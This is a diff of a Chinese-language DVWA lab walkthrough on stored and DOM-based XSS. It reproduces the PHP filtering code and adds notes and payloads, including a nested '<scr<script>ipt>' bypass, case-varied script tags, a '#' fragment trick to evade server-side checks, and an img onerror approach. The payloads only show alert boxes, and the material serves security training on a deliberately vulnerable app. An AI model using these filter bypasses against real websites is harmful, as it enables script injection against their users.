@@ -478,10 +478,10 @@ strip_tags() 剥去字符串中的 HTML、XML 以及 PHP 的标签。
 addslashes() 返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。
 htmlspecialchars() 把预定义的字符 &quot;&lt;&quot; （小于）和 &quot;&gt;&quot; （大于）转换为 HTML 实体， 转换为实体常用于防止浏览器将其用作 HTML 元素
 str_replace(&apos;&lt;script&gt;&apos;) 以其他字符替换字符串中的一些字符（区分大小写）且只替换一次
-</code></pre><p>首先对传进来的值去除了两端的空白字符，将message变量的值中的预定义字符前添加了反斜杠，并转为了html实体，变量name把<script>替换了一次，且不区分大小写,这里要注意在客户端限制了输入的字符数，我们看到两个输入框，但是对name的限制更小，用firebug把输入十个字符的限制在客户端改成100。</p>
+</code></pre><p>首先对传进来的值去除了两端的空白字符，将message变量的值中的预定义字符前添加了反斜杠，并转为了html实体，变量name把&lt;script替换了一次，且不区分大小写,这里要注意在客户端限制了输入的字符数，我们看到两个输入框，但是对name的限制更小，用firebug把输入十个字符的限制在客户端改成100。</p>
 <h4 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;
 &lt;Script&gt;alert(/xss/)&lt;/script&gt;
-</code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><h3 id="Stored-XSS-Source-2"><a href="#Stored-XSS-Source-2" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><pre><code>&lt;?php 
+</code></pre><h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><h3 id="Stored-XSS-Source-2"><a href="#Stored-XSS-Source-2" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><pre><code>&lt;?php 
 
 if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { 
     // Get input 
@@ -557,6 +557,8 @@ generateSessionToken();
     &lt;/select&gt;
     &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;
 &lt;/form&gt;
+</code></pre><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>在script脚本里，通过document操作后将default后面的参数值直接赋值给了lang，经过url解码后将其值赋给option标签的value属性节点和文本节点直接显示出来， 直接将default后面的参数值改为test后可以看到显示了test</p>
+<h4 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;script&gt;alert(/xss-dom/)&lt;/script&gt;
 </code></pre><h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><pre><code>&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;
     &lt;select name=&quot;default&quot;&gt;
         &lt;script&gt;
@@ -577,8 +579,9 @@ generateSessionToken();
 
 
 stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）,这里过滤了&lt;script标签且大小形式了过滤了
-</code></pre><h4 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h4><h5 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h5><p>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤<br>    ?#default=<script>alert(/dom-xss-medium/)</script></p>
-<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造链接，要注意闭合</p>
+</code></pre><h4 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h4><h5 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h5><p>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤</p>
+<pre><code>?#default=&lt;script&gt;alert(/dom-xss-test-medium/)&lt;/script&gt;
+</code></pre><h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造链接，要注意闭合</p>
 <pre><code>img标签onerror事件加载
 document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);
 
@@ -605,8 +608,8 @@ if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 
 } 
 
 ?&gt; 
-</code></pre><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>服务端使用了case语句进行判断，不能再通过其他JavaScript事件来绕过了<br>这里我们使用 # 来跳过服务端检查</p>
-<h4 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h4><pre><code>#?default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+</code></pre><h4 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h4><p>服务端使用了case语句进行判断，不能再通过其他JavaScript事件来绕过了<br>这里我们使用 # 来跳过服务端检查</p>
+<h4 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h4><pre><code>#?default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
 </code></pre><p>验证成功</p>
 <h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><h4 id="Vulnerability-Source-1"><a href="#Vulnerability-Source-1" class="headerlink" title="Vulnerability Source"></a>Vulnerability Source</h4><pre><code>&lt;?php 
 
